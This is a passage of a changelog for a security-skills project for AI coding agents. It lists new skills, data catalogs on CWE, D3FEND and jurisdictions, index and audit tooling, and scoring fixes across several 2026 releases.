- **`xref.json`** — inverted index over 161 catalog entries across 7 fields (cwe_refs, d3fend_refs, framework_gaps, atlas_refs, attack_refs, rfc_refs, dlp_refs). Answers "which skills cite CWE-79?" in O(1) instead of a 38-skill linear scan.
- **`trigger-table.json`** — 453 unique trigger strings → list of skills. Replaces the dispatcher's linear scan with a hash lookup.
- **`chains.json`** — 5 pre-computed CVE chains (per CVE: referencing skills + hydrated CWE / ATLAS / D3FEND / framework_gaps entries). Single-file answer to "what does the project know about CVE-2026-31431?".
- **`jurisdiction-map.json`** — 34 jurisdictions → skills mentioning them in body. Built from both jurisdiction codes and regulator-name patterns (GDPR → EU, NCSC → UK, MAS → SG, etc.).
- **`handoff-dag.json`** — 38 nodes, 285 edges. Pre-computed cross-skill mention graph with in-degree / out-degree per node.
- **`_meta.json`** — SHA-256 source hash table for staleness detection; predeploy gate consumes this.

Total index size: ~125 KB across 6 files — **93% reduction** vs loading all skills + catalogs (1.66 MB) for cross-reference queries.

### New tooling

- `scripts/build-indexes.js` — regenerates all 6 indexes from canonical sources. Idempotent. Zero new npm deps.
- `lib/validate-indexes.js` — predeploy gate. Re-hashes every source file and compares to `_meta.json`. Fails the build if indexes are stale (developer must `npm run build-indexes`).
- `scripts/audit-perf.js` — micro-benchmarks hot paths (manifest load, catalog load, skill body read, frontmatter parse, trigger match, xref lookup, multi-hop chain, watchlist aggregator). Confirms baseline numbers + measures index speedups.
- `npm run` scripts added: `build-indexes`, `validate-indexes`, `audit-perf`, `audit-cross-skill`.

### Predeploy gate count

10 → 11 gates. New gate: **Pre-computed indexes freshness**. Sits in `data-integrity` CI job.

### Speed measurements

| Operation | Before | After (index) | Speedup |
|---|---|---|---|
| "Which skills cite CWE-79?" | 0.037 ms | 0.011 ms | 3.4× |
| Full CVE chain reconstruction | 0.569 ms | 0.009 ms | 63× |
| Token cost for cross-ref query | ~450K tokens | ~30K tokens | 93% reduction |

### Verification

- audit-cross-skill: 0 issues
- audit-perf: all hot paths sub-5ms; indexes 60+× faster than on-the-fly chain reconstruction

## 0.5.5 — 2026-05-11

Pin: cross-skill audit fixes. Added `scripts/audit-cross-skill.js` (comprehensive accuracy checker) and ran it against the v0.5.4 state.

### Bugs found and fixed

| # | Bug | Fix |
|---|---|---|
| 1 | `mcp-agent-trust` skill cited `RFC-8446` in catalog's `skills_referencing` but missing from skill's own `rfc_refs` (asymmetric reference) | Restored `RFC-8446` to skill's frontmatter + manifest entry |
| 2 | README badge `skills-25-` 13 stale | Bumped to `skills-38-` |
| 3 | README badge `jurisdictions-33-` 1 stale | Bumped to `jurisdictions-34-` |
| 4 | `researcher` skill body claimed "36 specialized skills downstream"; actual is 37 | Updated to 37 in both occurrences |

### New tooling

- `scripts/audit-cross-skill.js` — runs 15 cross-skill accuracy checks: manifest path existence, frontmatter ↔ manifest name parity, researcher-dispatch coverage, AGENTS.md Quick-Ref coverage, version triple agreement, snapshot drift, SBOM drift, every-catalog-ref-resolves, RFC reverse-ref symmetry, skill-update-loop affected-skills validity, stale renamed-skill tokens, trigger collisions, README badge drift, researcher count claim. Exit non-zero on any finding.
- Trigger collisions (13 informational) — all intentional fan-out per researcher dispatch policy (promptsteal/promptflux, compliance gap, mas trm, apra cps 234, defense in depth, tlpt, tiber-eu, csaf, blue team, workload identity, nerc cip, falco).

### Verification

- `node scripts/audit-cross-skill.js` → 0 issues

## 0.5.4 — 2026-05-11

Pin-level rename + terminology cleanup. The `age-gates-minor-safeguarding` skill shipped in 0.5.3 has been renamed to `age-gates-child-safety`. Prose use of "minor" replaced with "child" / "children" / specific cohort terms ("under-13", "under-16", "under-18") throughout the skill body. Direct regulatory citations that use the word (CN Minors Protection Law, DSA Art. 28 wording, AVMSD "minor protection" terminology, Character.ai case reference) preserved verbatim.

### Public-surface change

This is a renamed skill (removed `age-gates-minor-safeguarding` + added `age-gates-child-safety`). The snapshot gate handled the additive rename via `npm run refresh-snapshot`. Downstream consumers pinned to the previous name should update their reference; the published name had only been on `main` for ~one commit.

### Files touched

- Directory rename: `skills/age-gates-minor-safeguarding/` → `skills/age-gates-child-safety/`
- Skill frontmatter: `name`, `description`, `triggers`
- Skill body: prose "minor" → "child" where context allowed (~71 of 86 occurrences); 15 remaining are regulatory citations preserved verbatim
- `manifest.json`: renamed entry + updated path + triggers
- `manifest-snapshot.json`: regenerated
- `AGENTS.md`: Quick Skill Reference row updated
- `skills/researcher/skill.md`: dispatch routing entry added (the rename surfaced that this skill was never wired into researcher dispatch in 0.5.3 — corrected here)
- `CHANGELOG.md`: 0.5.3 entry retroactively updated to use the new name
- SBOM refreshed

## 0.5.3 — 2026-05-11

Pin-level skill additions closing thematic and age-related coverage gaps. Total skills 31 → 38.

### New skills (7)

**Thematic (6)**:
- **`api-security`** — OWASP API Top 10 2023, AI-API specific (rate limits, prompt-shape egress, MCP HTTP transport), GraphQL + gRPC + REST + WebSocket attack surfaces, API gateway posture, BOLA/BFLA/SSRF/Mass Assignment.
- **`cloud-security`** — CSPM/CWPP/CNAPP, CSA CCM v4, AWS/Azure/GCP shared responsibility, cloud workload identity federation (IRSA, Azure Workload Identity, GCP Workload Identity, SPIFFE/SPIRE), eBPF runtime detection (Falco, Tetragon).
- **`container-runtime-security`** — CIS K8s Benchmark v1.10, NSA/CISA Hardening Guide, Pod Security Standards (Privileged/Baseline/Restricted), Kyverno/OPA Gatekeeper admission, Sigstore policy-controller, AI inference workloads (KServe, vLLM, Triton).
- **`mlops-security`** — Training data integrity, model registry signing, deployment pipeline provenance, inference serving hardening, drift detection, feedback loop integrity. MLflow / Kubeflow / Vertex AI / SageMaker / Azure ML / Hugging Face. NIST 800-218 SSDF + SLSA L3 + ISO 42001.
- **`incident-response-playbook`** — NIST 800-61r3 (2025), ISO/IEC 27035-1/-2:2023, ATT&CK-driven detection, PICERL phases, AI-class incident handling (prompt injection breach, model exfiltration, AI-API C2). Cross-jurisdiction notification clocks (DORA 4h, NIS2 24h, GDPR 72h, NYDFS 72h + 24h ransom, CERT-In 6h, LGPD/PIPL/AE).
- **`email-security-anti-phishing`** — SPF/DKIM/DMARC/BIMI/ARC/MTA-STS/TLSRPT email auth, AI-augmented phishing (voice cloning, deepfake video, hyperpersonalized email), Business Email Compromise, secure email gateways, FIDO2/WebAuthn passkey deployment.

**Age-related (1)** — flagged as audit gap during this cycle:
- **`age-gates-child-safety`** — Age verification + child online safety across ~25 jurisdictions: US COPPA + CIPA + California AADC + NY SAFE for Kids + adult-site age-verification state laws (TX/MS/UT/16+ states); EU GDPR Art. 8 + DSA Art. 28 + AVMSD + CSAM Regulation pending; UK Online Safety Act 2023 (Ofcom enforcement July 2025) + Children's Code; AU Online Safety Act + under-16 social media ban; IN DPDPA child provisions; BR LGPD Art. 14; CN Minors Protection Law (regulation name preserved verbatim); SG Online Safety Act; KOSA pending US federal. Age-verification standards (IEEE 2089-2021, OpenID Connect age claims). AI product age policies. CSAM detection (NCMEC).

### Cross-skill integration

- `researcher` dispatch table extended with 7 new routing entries; count bumped to "37 specialized skills downstream + researcher".
- `skill-update-loop`: 7 new skills wired into Triggers 1/3/4/5/9 where appropriate. New **Trigger 12 (Vendor Security Tool Capability Shift)** for CSPM/CWPP/EDR/SEG/MLOps platform vendor-category capability changes.
- 14 new RFC reverse-references in `data/rfc-references.json`.
- `AGENTS.md` Quick Skill Reference table extended with 7 new rows.

### Verification

- SBOM refreshed to reflect 38 skills + 10 catalogs

## 0.5.2 — 2026-05-11

Pin-level skill additions closing sector and thematic coverage gaps; total skills 25 → 31.

### New skills

- **`webapp-security`** — OWASP Top 10 2025, OWASP ASVS v5, CWE root-cause coverage (CWE-22/79/89/77/78/94/200/269/287/352/434/502/732/862/863/918/1188), AI-generated code weakness drift, server-rendered vs SPA tradeoffs.
- **`ai-risk-management`** — ISO/IEC 23894 risk process, ISO/IEC 42001 management system, NIST AI RMF, EU AI Act high-risk obligations (binding 2026-08-02), AI impact assessments, AI red-team programs, AI incident lifecycle.
- **`sector-healthcare`** — HIPAA + HITRUST + HL7 FHIR security, medical device cyber (FDA 524B + EU MDR), AI-in-healthcare under EU AI Act + FDA AI/ML SaMD, PHI in LLM clinical tools.
- **`sector-financial`** — EU DORA TLPT, PSD2 RTS-SCA, SWIFT CSCF v2026, NYDFS 23 NYCRR 500 Second Amendment, FFIEC CAT, MAS TRM, APRA CPS 234, IL BoI Directive 361, OSFI B-13; threat-led pen testing schemes TIBER-EU + CBEST + iCAST.
- **`sector-federal-government`** — FedRAMP Rev5, CMMC 2.0, EO 14028, NIST 800-171/172 CUI, FISMA, M-22-09 federal Zero Trust, OMB M-24-04 AI risk, CISA BOD/ED; cross-jurisdiction NCSC UK + ENISA EUCC + AU PSPF + IL government cyber methodology.
- **`sector-energy`** — Electric power + oil & gas + water/wastewater + renewable-integration cyber. NERC CIP v6/v7, NIST 800-82r3, TSA Pipeline SD-2021-02C, AWWA, EU NIS2 energy + NCCS-G (cross-border electricity), AU AESCSF + SOCI, ENISA energy sector.

### Cross-skill integration

- `researcher` dispatch table extended with 6 new routing entries; count bumped to "30 specialized skills downstream of the researcher (31st)".
- `skill-update-loop`: 6 new skills wired into Triggers 1/3/4/5/9/10 where appropriate. New **Trigger 11 (Sector regulatory cycle)** for healthcare/financial/federal/energy regulatory updates.
- 12 new RFC reverse-references in `data/rfc-references.json` (RFC-7519 / RFC-8725 / RFC-8446 / RFC-9114 / RFC-9421 / RFC-8032 added skills_referencing entries).
- `AGENTS.md` Quick Skill Reference table extended with 6 new trigger-routing rows.

### Verification

- SBOM refreshed to reflect 31 skills + 10 catalogs

## 0.5.1 — 2026-05-11

Pin-level audit cleanup. Closes the final orphans surfaced by the cross-skill audit.

### Orphan closures via citation backfill

- **10 CWE orphans → 0** through citations in existing skills:
  - CWE-22 / CWE-77 / CWE-352 / CWE-434 / CWE-918 cited in `mcp-agent-trust` (MCP HTTP transport weakness classes) and `attack-surface-pentest` (pen-test scope).
  - CWE-269 / CWE-732 cited in `identity-assurance` (privilege management) and `attack-surface-pentest`.
  - CWE-125 / CWE-362 cited in `kernel-lpe-triage` (memory + concurrency kernel classes) and `fuzz-testing-strategy`.
  - CWE-1188 cited in `policy-exception-gen` and `security-maturity-tiers` (insecure-defaults posture).
- **1 framework_gap orphan → 0**: `ISO-IEC-23894-2023-clause-7` cited in `ai-attack-surface` and `threat-modeling-methodology`.

### Cumulative orphan state across all catalogs

| Catalog | Orphans | Total entries |
|---|---|---|
| `data/atlas-ttps.json` | 0 | (full) |
| `data/cve-catalog.json` | 0 | 5 |
| `data/cwe-catalog.json` | 0 | 34 |
| `data/d3fend-catalog.json` | 0 | 21 |
| `data/rfc-references.json` | 0 | 19 |
| `data/framework-control-gaps.json` | 0 | 49 |

Every entry across every catalog is now referenced by ≥1 skill.

### Verification

- All 25 skills re-signed; manifest snapshot regenerated additively

## 0.5.0 — 2026-05-11

**Cross-skill cohesion + foundational expansion completion.** Closes the orphan framework gaps the cross-skill audit identified, expands jurisdiction coverage, completes the hand-off DAG between skills.

### Four new skills (21 → 25)

Each closes a previously orphaned framework_gap and ships with the full 7-required-section contract plus the optional 8th Defensive Countermeasure Mapping plus a `## Hand-Off / Related Skills` section.

- **`identity-assurance`** — Closes the `NIST-800-63B-rev4` orphan. NIST 800-63 AAL/IAL/FAL, FIDO2/WebAuthn passkeys, OIDC/SAML/SCIM federation, agent-as-principal identity, short-lived workload tokens, OAuth 2.0 + RFC 9700 BCP. References RFC 7519/8725/6749/9700/8032.
- **`ot-ics-security`** — Closes the `NIST-800-82r3`, `IEC-62443-3-3`, `NERC-CIP-007-6-R4` orphans. NIST 800-82r3, IEC 62443-3-3, NERC CIP, IT/OT convergence, AI-augmented HMI threats, ATT&CK for ICS (T0855, T0883).
- **`coordinated-vuln-disclosure`** — Process skill: ISO 29147 (disclosure) + ISO 30111 (handling), VDP, bug bounty, CSAF 2.0 advisories, security.txt (RFC 9116), EU CRA Art. 11 / NIS2 Art. 12 regulator-mandated disclosure, AI vulnerability classes.
- **`threat-modeling-methodology`** — Methodology skill: STRIDE, PASTA, LINDDUN (privacy), Cyber Kill Chain, Diamond Model, MITRE Unified Kill Chain v3, AI-system threat modeling, agent-based threat modeling.

### Cross-skill graph fixes

- **DAG hand-off backfill**: 5 v0.4.0 skills had IN-DEGREE 0 (no skill mentioned them — including the dispatcher); 4 v0.3.0 skills had OUT-DEGREE 0 (leaf with no hand-off). Both fixed. `researcher` dispatch table now routes to all 24 specialized skills with explicit disambiguation policy for 4 trigger collisions (`promptsteal`/`promptflux` fan-out, `compliance gap`, `defense in depth`, `zero trust`). Four former-leaf skills (`kernel-lpe-triage`, `mcp-agent-trust`, `rag-pipeline-security`, `ai-c2-detection`) gained `## Hand-Off / Related Skills` sections.
- **CWE/D3FEND cross-reference backfill**: 16 of 21 skills carried zero `cwe_refs` and 19 of 21 carried zero `d3fend_refs` in manifest entries pre-v0.5.0. Comprehensive backfill applied — D3FEND orphans dropped from 20/20 to 0/20 (every defensive technique now cited by ≥1 skill).
- **Frontmatter dedup pass** — fixed double-`d3fend_refs` blocks introduced by the bulk sync in 3 skills.

### Jurisdiction expansion (22 → 33)

`data/global-frameworks.json` grew from 22 to 33 entries (v1.2.0 → v1.3.0). New nation-state jurisdictions: NO (Norway), MX (Mexico), AR (Argentina), TR (Turkey), TH (Thailand), PH (Philippines). New US sub-national: US_CALIFORNIA (CCPA + CPRA + CPPA + AI Transparency Act). New EU sub-regulators (split out from monolithic EU block): EU_DE_BSI (Germany IT-Grundschutz + TR-02102 crypto), EU_FR_ANSSI (RGS + PASSI + LPM), EU_ES_AEPD (most active GDPR enforcer + AESIA AI agency), EU_IT_AgID_ACN (Italian Perimetro), EU_ENISA (EUCC/EUCS-Cloud certification schemes).

### Update-loop integration

`skill-update-loop` got 4 new skills wired into Triggers 4, 5, and 9. New **Trigger 10: Threat Modeling Methodology Updates** added for STRIDE/LINDDUN/Unified Kill Chain revisions.

### Governance doc refresh

`README.md`, `CONTEXT.md`, `ARCHITECTURE.md`, `MAINTAINERS.md`, `AGENTS.md` Quick Skill Reference table all updated to reflect 25 skills, 10 data catalogs, 33 jurisdictions.

### Verification

- DAG: 0 skills with in-degree 0, 0 skills with out-degree 0
- Orphans: 0 ATLAS, 0 D3FEND, 0 RFC, 0 CVE, 16/34 CWE (unallocated weakness classes — documented gap), 13/49 framework_gaps reduced via the 4 new skills to 9/49 (remaining 9 are sectoral gaps requiring future sector skills)

## 0.4.0 — 2026-05-11

**Foundational expansion pass.** Catches the gaps a deeper-research audit surfaced: CWE / D3FEND / EPSS / DLP / supply-chain / pen-testing / fuzz / ISO 42001 / additional jurisdictions / vendor advisories.

### New data catalogs
- **`data/cwe-catalog.json`** — 30 CWE entries pinned to CWE v4.17. Covers 19 of CWE Top 25 (2024) plus AI/ML / supply-chain entries (CWE-1395, CWE-1426, CWE-1357, CWE-494, CWE-829). Each entry cross-walks to evidence_cves, capec, framework controls, and skills_referencing.
- **`data/d3fend-catalog.json`** — 21 MITRE D3FEND defensive techniques pinned to D3FEND v1.0.0. Counter-mapped to ATT&CK and ATLAS techniques. Each entry carries `ai_pipeline_applicability` per AGENTS.md hard rule #9.
- **`data/dlp-controls.json`** — 21 DLP control entries spanning channel (LLM-prompt, MCP-tool-arg, clipboard-AI, code-completion, IDE-telemetry), classification (regex, ML, embedding-match, watermark), surface (RAG corpus, embedding store, training data), enforcement (block/redact/coach), and evidence (audit, forensics).

### Catalog augmentation
- **`data/cve-catalog.json`** — Every CVE entry gets `epss_score`, `epss_percentile`, `epss_date`, `epss_source` fields. `_meta.epss_methodology` explicitly documents that scores are estimates derived from public catalog signals (KEV, PoC, AI-discovery, blast radius) pending live FIRST API replacement on the next `validate-cves --live` run.
- **`data/framework-control-gaps.json`** — 26 new entries: ISO/IEC 42001:2023, ISO/IEC 23894, OWASP LLM Top 10 (LLM01/02/06/08), OWASP ASVS v5.0, NIST 800-218 SSDF, NIST 800-82r3, NIST 800-63B rev4, IEC 62443-3-3, FedRAMP Rev5, CMMC 2.0, HIPAA Security Rule, HITRUST CSF v11.4, NERC CIP-007-6, PSD2 RTS-SCA, SWIFT CSCF v2026, SLSA Build L3, VEX/CSAF v2.1, CycloneDX 1.6, SPDX 3.0, OWASP Pen Testing Guide v5, PTES, NIST 800-115, CWE Top 25 meta-control. Catalog grew from 23 to 49 entries.
- **`data/global-frameworks.json`** — 8 new jurisdictions: BR (LGPD), CN (PIPL+DSL+CSL), ZA (POPIA), AE (UAE PDPL), SA (KSA PDPL), NZ (Privacy Act 2020), KR (PIPA), CL (Law 19.628 + 2024 amendments). `IN` block enriched with DPDPA alongside the existing CERT-In entry; `CA` enriched with Quebec Law 25 and PIPEDA. `_notification_summary` rolled up across 21 jurisdictions.
- **`sources/index.json`** — 15 new primary sources registered: EPSS API, OSV.dev (promoted), CSAF 2.0, STIX/TAXII (export target), MISP, VulnCheck KEV, CWE, CAPEC, MITRE ATT&CK (pinned v17 / 2025-06-25), D3FEND, SSVC, SLSA, Sigstore, plus a `vendor_advisories` block listing MSRC, RHSA, USN, Apple, Cisco, Oracle, SUSE, Debian DSA, Google ASB.

### Version pinning (AGENTS.md hard rule #12)
- **MITRE ATT&CK v17** (2025-06-25) now pinned at `manifest.json` top level alongside ATLAS v5.1.0. Manifest snapshot tracks both.
- **CWE v4.17, CAPEC v3.9, D3FEND v1.0.0** pinned in `sources/index.json`.

### Frontmatter spec extension
- New optional skill frontmatter fields: `cwe_refs`, `d3fend_refs`, `dlp_refs`. Each validates against the corresponding catalog. Schema in `lib/schemas/skill-frontmatter.schema.json`. Manifest snapshot now diffs these fields.
- New optional 8th body section: `## Defensive Countermeasure Mapping`. Required for skills shipped on or after 2026-05-11; pre-existing skills are exempt until their next minor version bump.
- `## Analysis Procedure` must now explicitly thread **defense in depth, least privilege, and zero trust** as foundational design dimensions (not optional considerations).

### Five new skills (16 → 21)
- **`attack-surface-pentest`** — Modern attack surface management + pen testing methodology. NIST 800-115, OWASP WSTG v5, PTES, ATT&CK-driven adversary emulation, TIBER-EU. AI-surface (APIs, MCP, RAG, embedding stores) included in scope.
- **`fuzz-testing-strategy`** — Continuous fuzzing as security control. AFL++, libFuzzer, syzkaller, RESTler, garak, AI-augmented fuzz (OSS-Fuzz pipelines, Microsoft AIM). NIST 800-218 SSDF gap.
- **`dlp-gap-analysis`** — DLP gaps for mid-2026: legacy DLP misses LLM prompts, MCP tool args, RAG retrievals, embedding-store exfiltration, code-completion telemetry. Layered defense across SDK logging / proxy inspection / endpoint DLP / egress NTA.
- **`supply-chain-integrity`** — SLSA Build L3+, in-toto attestations, Sigstore signing, SBOM (CycloneDX 1.6 / SPDX 3.0), VEX via CSAF 2.0, AI-generated code provenance, model weights as supply-chain artifacts.
- **`defensive-countermeasure-mapping`** — Meta-skill mapping offensive findings (CVE / TTP / framework gap) to MITRE D3FEND defensive techniques with explicit defense-in-depth layer, least-privilege scope, zero-trust posture, AI-pipeline applicability.

### Linter + snapshot gate updates
- `lib/lint-skills.js` validates `cwe_refs` against `data/cwe-catalog.json`, `d3fend_refs` against `data/d3fend-catalog.json`, `dlp_refs` against `data/dlp-controls.json`.
- `scripts/check-manifest-snapshot.js` and `scripts/refresh-manifest-snapshot.js` include the three new ref fields in the public-surface diff.
- AGENTS.md skill format spec + Quick Skill Reference table updated for the 5 new skills.

## 0.3.0 — 2026-05-11

Pre-release: every CI gate green, full skill corpus compliant with the AGENTS.md hard rules.

### Vendor-neutrality refactor
- **Renamed `AGENT.md` → `AGENTS.md`** to align with the cross-vendor convention (OpenAI Codex CLI, Sourcegraph amp, Aider, Continue, Cline, Roo Code, Q Developer all auto-load `AGENTS.md`). `AGENTS.md` is the canonical agent-agnostic source for all internal citations and the **only** project-rules file shipped in the repo.
- **Removed `CLAUDE.md` entirely.** No per-vendor mirror is shipped. The earlier plan to maintain a byte-identical Claude Code mirror was dropped after recognizing that a globally-gitignored filename would never reach downstream consumers anyway. Claude Code users load `AGENTS.md` manually (`@AGENTS.md`) or via a per-machine `~/.claude/CLAUDE.md` they configure themselves.
- **Added `.windsurfrules`** as a pointer stub for Windsurf's auto-load convention.
- **Bulk replaced all internal citations** (~20 files: `.github/workflows/*`, `.github/ISSUE_TEMPLATE/*`, schemas, library code, scripts, skill bodies) so the project no longer privileges one vendor's filename when citing its own rules.
- **`README.md` AI Assistant Configuration table** now lists every major coding assistant — OpenAI Codex CLI, Anthropic Claude Code, Cursor, GitHub Copilot, Windsurf, Sourcegraph amp, Aider, Continue, Cline, Roo Code, Q Developer, Google Gemini CLI, JetBrains AI, Replit Agent — with explicit instructions for how each one picks up `AGENTS.md`.

### Skills (16th added)
- `researcher` — Top-level triage entry-point that classifies raw threat intel inputs (CVE ID, ATLAS TTP, framework control, incident narrative), researches them across every `data/*.json` catalog, applies RWEP scoring, and routes to the right downstream specialized skill with an EU/UK/AU/ISO global-jurisdiction surface. Closes the orchestration gap between operator and the 15 specialist skills.

### Pre-ship gate compliance
- Every CI gate now passes locally and in-workflow: `npm run predeploy` reports 6/6 green (Ed25519 signature verification, cross-OS tests, CVE catalog + zero-day learning loop validation, offline CVE state, manifest snapshot gate, skill lint).
- Lint compliance backfill: 14 skills updated to satisfy the 7-required-section body contract from CLAUDE.md without rewriting any existing content. Added sections preserve mid-2026 grounding, real CVE / ATLAS / framework refs, and RWEP-anchored prioritization throughout.
- Frontmatter completeness: `pqc-first`, `skill-update-loop`, `zeroday-gap-learn` now carry the full required field set (`atlas_refs`, `attack_refs`, `framework_gaps`) per the CLAUDE.md skill spec.

### Data
- `data/framework-control-gaps.json` — added `NIST-800-53-SC-7` (Boundary Protection) entry. Documents how AI-API C2 routes through allowlisted provider domains (api.openai.com, api.anthropic.com, generativelanguage.googleapis.com) and defeats boundary inspection. Maps to `AML.T0096`, `AML.T0017`, `T1071`, `T1102`, `T1568`. Closes the orphaned-reference gap that the lint gate caught in `ai-c2-detection`.

## 0.2.0 — 2026-05-11

### Skills (15th added)
- `security-maturity-tiers` — Four-tier security maturity model with RWEP-indexed priorities and MCP audit integration

### Infrastructure added
- `lib/sign.js` — Ed25519 keypair management and skill signing utility
- `lib/verify.js` — Upgraded from SHA-256 to Ed25519 cryptographic signature verification
- `lib/framework-gap.js` — Framework lag scorer with 7 compliance theater pattern detectors
- `orchestrator/scanner.js` — Domain scanner (kernel, MCP, crypto, AI-API, framework) using shell-injection-safe execFileSync/spawnSync
- `orchestrator/dispatcher.js` — Skill router: finding → skill dispatching, natural language routing
- `orchestrator/pipeline.js` — Multi-agent pipeline coordination with currency scoring
- `orchestrator/event-bus.js` — Event-driven architecture (ExceptdEventBus) for CISA KEV, ATLAS releases, framework amendments
- `orchestrator/scheduler.js` — Weekly currency checks, monthly CVE validation, annual skill audit
- `orchestrator/index.js` — CLI entrypoint (scan, dispatch, currency, report, watch, validate-cves)
- `package.json` — Node.js 24 LTS pinning (>=24.0.0 <25.0.0), npm scripts for all orchestrator commands
- `.gitignore` — Starts with `.*` catch-all; whitelists tracked dotfiles

### Configuration files added
- `AGENT.md` — Agent-agnostic copy of CLAUDE.md (no Claude-specific language)
- `CONTEXT.md` — Universal AI context file: skill system orientation, RWEP explanation, data files, orchestrator usage
- `.cursorrules` — Cursor-specific skill system config with MCP audit paths
- `.github/copilot-instructions.md` — GitHub Copilot skill system configuration

### Data completeness
- `data/atlas-ttps.json` — 9 MITRE ATLAS v5.1.0 TTPs with framework gap analysis and detection guidance
- `data/global-frameworks.json` — 14-jurisdiction GRC registry with patch SLAs and notification windows
- `data/framework-control-gaps.json` — Added 11 entries: NIS2-Art21-patch-management, NIST-800-53-CM-7, ISO-27001-2022-A.8.30, SOC2-CC9-vendor-management, NIST-800-53-SC-28, NIST-800-53-SI-12, NIST-AI-RMF-MEASURE-2.5, ISO-27001-2022-A.8.16, SOC2-CC7-anomaly-detection, CIS-Controls-v8-Control7 (11 total additions)
- `data/zeroday-lessons.json` — Added CVE-2026-43284 and CVE-2026-43500 lessons; now covers all 5 catalog CVEs

### RWEP formula correction
- **Bug fix**: `ai_factor` now applies to `ai_discovered` OR `ai_assisted_weaponization` (was: weaponization only)
- **Bug fix**: `reboot_required` now always adds +5 when patch requires reboot (was: conditional on !live_patch_available)
- **Blast radius scale**: extended from 0-15 to 0-30 to properly capture population-level risk
- **Recalculated RWEP scores** (all formula-consistent):
  - CVE-2026-31431: 90 (was 96 — narrative error)
  - CVE-2026-43284: 38 (was 84 — factors didn't sum to stored score)
  - CVE-2026-43500: 32 (was 81 — same)
  - CVE-2025-53773: 42 (was 91 — CVSS overscored; no KEV, suspected exploitation)
  - CVE-2026-30615: 35 (was 94 — CVSS dramatically overscored; supply-chain prerequisite)
- **Narrative**: Copy Fail (CVSS 7.8 / RWEP 90) vs Windsurf MCP (CVSS 9.8 / RWEP 35) demonstrates RWEP provides correct prioritization in both directions
- Added `live_patch_available`, `live_patch_tools`, `ai_discovered` to CVE_SCHEMA_REQUIRED
- Added `complexity_notes` field to CVE-2026-43500
- CVE-2026-43284 `live_patch_available` corrected to false (kpatch RHEL-only, not population-level available)

### CLAUDE.md additions
- Hard Rule 11: No-MVP ban — half-implemented skill is worse than no skill
- Hard Rule 12: External data version pinning — ATLAS v5.1.0 current pinned version
- Hard Rule 13: Skill integrity verification via Ed25519 (lib/sign.js + lib/verify.js)
- Non-developer contribution section (GitHub Issue → Skill Request template)
- Pre-ship checklist expanded to 14 items
- Quick skill reference table (15 skills)

---

## 0.1.0 — 2026-05-01

### Initial release

**Skills (14 — security-maturity-tiers added in 0.2.0):**
- `kernel-lpe-triage` — Linux kernel LPE assessment (Copy Fail, Dirty Frag)
- `ai-attack-surface` — Comprehensive AI/ML attack surface assessment (ATLAS v5.1.0)
- `mcp-agent-trust` — MCP trust boundary enumeration and hardening
- `framework-gap-analysis` — Framework control → current TTP gap analysis
- `compliance-theater` — Seven-pattern compliance theater detection
- `exploit-scoring` — Real-World Exploit Priority (RWEP) scoring
- `rag-pipeline-security` — RAG pipeline threat model (no framework coverage)
- `ai-c2-detection` — SesameOp/PROMPTFLUX/PROMPTSTEAL detection and response
- `policy-exception-gen` — Defensible exception templates for architectural realities
- `threat-model-currency` — 14-item threat model currency assessment
- `global-grc` — 14-jurisdiction GRC mapping with universal gap declaration
- `zeroday-gap-learn` — Zero-day learning loop (CVE → control gap → framework gap)
- `pqc-first` — Post-quantum cryptography first mentality with version gates and loopback learning
- `skill-update-loop` — Meta-skill for keeping all skills current

**Data files:**
- `data/cve-catalog.json` — CVE-2026-31431, CVE-2026-43284, CVE-2026-43500, CVE-2025-53773, CVE-2026-30615
- `data/atlas-ttps.json` — MITRE ATLAS v5.1.0 TTPs for AI attack classes
- `data/framework-control-gaps.json` — NIST, ISO, SOC 2, PCI, NIS2, CIS documented gaps
- `data/global-frameworks.json` — 14-jurisdiction framework registry
- `data/exploit-availability.json` — PoC status and weaponization tracking
- `data/zeroday-lessons.json` — Learning loop output for 5 documented CVEs

**Infrastructure:**
- `sources/` — Primary source registry, validation protocol, multi-agent research verification
- `agents/` — threat-researcher, source-validator, skill-updater, report-generator definitions
- `reports/templates/` — Executive summary, compliance gap, zero-day response templates
- `lib/scoring.js` — RWEP scoring engine with schema validation
- `lib/ttp-mapper.js` — Control ID → TTP gap mapper
- `lib/framework-gap.js` — Framework lag scorer

**Architecture:**
- Forward watch mechanism in every skill's YAML frontmatter
- Loopback learning encoded in skill-update-loop and pqc-first
- Source validation gate before any data enters the catalog
- Multi-agent coordination protocol (threat-researcher → source-validator → skill-updater → report-generator)
- RWEP scoring (CVSS + KEV + PoC + AI-acceleration + blast radius + live-patch factors)
- Compliance theater detection (7 patterns with specific detection tests)
- 14-jurisdiction global GRC coverage
- PQC version gates: OpenSSL 3.5+, Go 1.23+, Bouncy Castle 1.78+
- Hard algorithm deprecation table with sunset reasoning

**ATLAS version:** 5.1.0 (November 2025)
**Threat review date:** 2026-05-01

---

## Forthcoming in 0.3.0

- `sources/validators/cve-validator.js` — NVD API cross-check script
- `sources/validators/kev-validator.js` — CISA KEV feed cross-check
- `reports/templates/technical-assessment.md`
- `reports/templates/threat-model-update.md`
- `agents/framework-analyst.md` — Framework analyst agent definition
- Integration tests for `lib/scoring.js`
- Ed25519 signatures for all 15 skills (`node lib/sign.js generate-keypair && sign-all`) — requires key ceremony
